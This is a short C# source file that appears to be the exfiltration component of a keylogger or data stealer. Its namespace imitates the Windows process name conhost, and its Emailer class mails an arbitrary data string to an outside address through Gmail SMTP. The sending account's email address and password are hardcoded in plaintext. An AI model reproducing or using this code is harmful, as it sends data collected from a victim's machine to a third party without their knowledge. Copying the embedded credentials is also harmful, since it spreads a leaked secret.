using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Mail;


namespace ConvHost32
{
    class Emailer
    {
        public static void Email(string data)
        {
            string strHostName = Dns.GetHostName();
            IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
            /* Sets up the email smtp client to connect to the smtp gmail server */
            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Port = 587,
                Credentials = new NetworkCredential("c0ckermandog420@gmail.com", "Kalix123!"),
                EnableSsl = true,
            };

            smtpClient.Send("c0ckermandog420@gmail.com", "arinkharkar@gmail.com", "c0ckerman", data);
        }
    }
  
}
